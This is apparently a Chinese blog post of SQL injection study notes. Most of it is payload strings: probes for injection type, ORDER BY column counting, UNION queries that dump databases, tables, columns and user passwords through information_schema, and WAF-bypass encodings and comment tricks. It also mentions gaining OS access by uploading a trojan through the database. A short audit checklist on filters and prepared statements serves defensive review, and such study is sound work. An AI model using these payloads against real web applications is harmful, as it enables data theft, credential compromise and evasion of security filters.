
---
layout: mypost
title: SQL注入笔记
categories: [信息安全]
---

## 一. 注入类型
字符型；数字型；搜索型

## 二. 数据提交方式
- GET注入
- POST注入
- Cookie注入
- HTTP头注入

## 三. 执行效果
- 联合查询注入
- 基于报错注入
- 堆查询注入
- 基于布尔的盲注
- 基于时间的盲注


## 四. 审计流程

#### 第一步：发现注入点
注入点发现自动方式：使用web漏洞扫描工具，自动进行注入点发现
手工方式：构造sql语句进行注入点发现。

#### 第二步：信息获取
1.环境信息：数据库类型；数据库版本；操作系统版本；用户信息等。
2.数据库信息：数据库名；表；字段；值（加密内容破解）

#### 第三步：获取权限
获取操作系统权限：通过数据库执行Shell，上传木马。


## 五. 类型判断

数字型：
```
user_id=$id
数字型注入： http://www.xxx.com/?id=7
提交：7   
select * from 表名 where id=7;
提交：7 and 1=1    
Select * from 表名 where id=7 and 1=1;
提交：7 and 1=2    
Select * from 表名 where id=7 and 1=2;
单引号测试： http://www.xxx.com/?id= ‘
Select 空 from 表 where id= ‘;
```
字符型：

```
user_id='$id'
字符型注入： http://www.xxx.com/?id=8
提交：8
select * from 表名 where name=‘8’;
提交 8 and 1=1
Select * from 表名 where name=‘8 and 1=1’;
提交：8’and 1=1—
select * from 表名 where name=‘8’and 1=1-- ’; 
提交：8’and 1=2—
select * from 表名 where name=‘8’ and 1=2-- ’;
单引号测试： http://www.xxx.com/?id= ‘
Select 空 from 表 where id=‘ ’’; 
```

注释终止


```
#
--  
```

## 六. 审计要点
1. 是否存在全局过滤器
2. 过滤器是否能过滤所有查询请求
3. 过滤器是否按要求过滤处理
4. 过滤器是否符合要求
5. 是否使用预编译
6. 是否存在sql语句拼接





## 七. 注入流程

### 判断注入类型

输入一个 ' 让其报错查看是否执行sql语句

![a314b63dc8330a3fca22329963cdb9ca.png](en-resource://database/497:1)

输入：

**1or1=** 查询是否输出信息
如果返回信息 表示可能为数值型注入
输入：
**1'or'1'='1**
**1'and'1'='1**
如果报错，应该为数字型注入，如果没有报错就是字符型注入。

数字型：and 1 = 1 and 1 =2
字符型：'and'1' ='1' and '1' ='2
搜索型：关键字%' and 1 =1 and '%'='% 关键字%' and 1=2 and '%'='%
![12dce10afa0aa90e71b0c56b637cf66c.png](en-resource://database/499:1)
其他检测类型

 or 1=1--+
 'or 1=1--+
 "or 1=1--+
 )or 1=1--+ 
 ')or 1=1--+ 
 ") or 1=1--+
 "))or 1=1--+      
 and xor or

### 通过sql语句判断数据库类型与信息搜集

IIS报错的情况下使用：
and user >0 (判断是access 还是 mysql ）

不报错使用各数据库特性来判断
```sql
and (select count(*) from msyobjects) >0 (返回权限不足access数据库）
and (select count(*) from sysobjects)>0 （返回正常则是mysql数据库）
and db_name()=1
```
![705f843c8ad3a3c61364ad46123beb8c.png](en-resource://database/572:1)


### 猜解字段长度

1,2 回显正常，3报错，确认该sql对应库只有两列。
```sql
1'order by 1#
1'order by 2#
1'order by 3#
......
```
![605b2764ccb3d52f2f6260b3f5c67d75.png](en-resource://database/501:1)

### 验证长度
```sql
 1' and 1=2 union select 1,2; #
```

![56cce309a589f7a72e0bc2188780ce68.png](en-resource://database/503:1)

### mysql 相关函数

相关函数

system_user() 系统用户名
user() 用户名
current_user 当前用户名
session_user() 连接数据库的用户名
database() 数据库名
version() MYSQL数据库版本
load_file() MYSQL读取本地文件的函数
@@datadir 读取数据库路径
@@basedir MYSQL 安装路径
@@version_compile_os 操作系统

![9662165537501c21a89fbd85e9dfec96.png](en-resource://database/509:1)
![c2d97fd712f3a01264c555f2fc9acee6.png](en-resource://database/568:1)
![0f730e51e5b27b5e67d1fa1a389bc611.png](en-resource://database/570:1)



### 使用exists函数验证列名
如果有报错说明该列表不存在，如果没有报错，说明该列表存在
```sql
```
1' and exists (select ** from users)#
```

![b9f18e4cb88b47ae1b51a7a41026d04f.png](en-resource://database/511:0)



### 使用sql视窗直接爆库，表，字段


information_schema 系统库保存了所有字符集，查询该库已爆库；表；字段

查询所有库名
```sql
1' union select 1,group_concat(schema_name) from information_schema.schemata#
```

![aa876d22bbeef89ee8dfc86cc539c591.png](en-resource://database/515:1)


查询所有表名
```sql
1' union select 1,group_concat(table_name) from information_schema.tables#
```

![4b7007bb2e9fdf4e02f826a23e20f95d.png](en-resource://database/519:1)


根据当前库名查询表名
```sql
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
```


![fe71415e88e8132e1ad616c93d606deb.png](en-resource://database/521:1)




根据查询到的表名users 查询字段
```sql
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#
```
![2785d02f2f31a6ff4d5a25a514f848c6.png](en-resource://database/523:1)

```sql
1' union select user,password from users#
```
![72cba3250733a2db93c4ffeba661ac89.png](en-resource://database/525:1)


## 八. 绕WAF
### 编码绕过
URL；十六进制；Unicode
url or1=1
%6f%72%20%31%3d%31

Unicode

单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7

空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0

左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8

右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9


### 等效函数

hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

substr((select 'password'),1,1) = 0x70

strcmp(left('password',1), 0x69) = 1

strcmp(left('password',1), 0x70) = 0

strcmp(left('password',1), 0x71) = -1

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir() 

### 等效符号
 >= ,<= ,is null,is not null,<>
 
 ### 注释
 
//, -- , /**/, #, --+,--  -, ;，--a

union select 1,2,3,4 或 union/**/select/**/ 1,2,3,4、
union /*aaaa%01bbs*/select
union /*aaaaaaaaaaaaaaaaaaaa*/select
/*!xxx*/



### 其它绕过
空格，空白符；大小写混输；关键字；插入注释；

/ *！SELECT * /可能会被WAF忽略，但传递给目标应用程序是由mysql数据库处理。

MySQL空白符：%09，%0A，%0B，%0D，%20，%0C，%A0，/*xxx*/
正则的空白符：%09，%0A，%0B，%0D，%20

union %250Cselect


'union%a0select pass from users#

index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
字符串判断绕过


